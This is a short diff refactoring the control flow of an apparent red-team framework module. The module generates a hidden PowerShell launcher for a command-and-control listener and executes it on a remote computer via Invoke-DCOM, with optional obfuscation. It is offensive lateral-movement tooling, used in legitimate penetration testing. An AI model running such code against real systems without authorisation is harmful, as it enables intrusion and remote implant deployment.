@@ -50,7 +50,7 @@ class Module:
             # not a valid listener, return nothing for the script
             return handle_error_message("[!] Invalid listener: " + listener_name)
 
-        elif listener_name:
+        if listener_name:
             # generate the PowerShell one-liner with all of the proper options set
             launcher = main_menu.stagergenv2.generate_launcher(
                 listener_name=listener_name,
@@ -66,21 +66,20 @@ class Module:
 
             if launcher == "":
                 return handle_error_message("[!] Error in launcher generation.")
-            else:
-                Cmd = (
-                    "%COMSPEC% /C start /b C:\\Windows\\System32\\WindowsPowershell\\v1.0\\"
-                    + launcher
-                )
+
+            Cmd = (
+                "%COMSPEC% /C start /b C:\\Windows\\System32\\WindowsPowershell\\v1.0\\"
+                + launcher
+            )
 
         else:
             Cmd = "%COMSPEC% /C start /b " + command.replace('"', '\\"')
 
         script_end = f"Invoke-DCOM -ComputerName {computer_name} -Method {method} -Command '{Cmd}'"
 
-        script = main_menu.modulesv2.finalize_module(
+        return main_menu.modulesv2.finalize_module(
             script=script,
             script_end=script_end,
             obfuscate=obfuscate,
             obfuscation_command=obfuscation_command,
         )
-        return script
